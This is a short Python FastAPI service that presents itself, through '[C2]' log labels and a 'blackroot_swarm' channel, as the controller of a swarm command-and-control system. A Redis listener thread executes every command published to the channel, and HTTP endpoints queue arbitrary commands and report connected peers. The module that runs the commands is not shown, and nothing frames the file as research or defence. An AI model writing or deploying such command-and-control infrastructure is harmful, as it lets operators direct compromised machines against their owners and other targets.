from fastapi import FastAPI, Request
from swarm_mesh import SwarmMesh
import redis
import json
import threading

app = FastAPI()
swarm = SwarmMesh("controller-node")
swarm.redis = redis.Redis(host="localhost", port=6379, decode_responses=True)
swarm.channel = "blackroot_swarm"

# Background listener loop for Redis Pub/Sub
def redis_listener():
    pubsub = swarm.redis.pubsub()
    pubsub.subscribe(swarm.channel)
    print(f"[C2] Subscribed to Redis channel: {swarm.channel}")
    for message in pubsub.listen():
        if message['type'] == 'message':
            try:
                command = json.loads(message['data'])
                print(f"[C2] Received command: {command}")
                swarm.inject_command(command)
                swarm.execute_command(command)
            except Exception as e:
                print(f"[C2][ERR] Failed to execute command: {e}")

listener_thread = threading.Thread(target=redis_listener, daemon=True)
listener_thread.start()

@app.post("/dispatch")
async def dispatch_command(request: Request):
    command = await request.json()
    swarm.inject_command(command)
    return {"status": "queued", "command": command}

@app.get("/status")
def status():
    return {
        "peers": list(swarm.peers.keys()),
        "pending": swarm.pending_commands
    }

@app.get("/ping")
def ping():
    return {"pong": True}
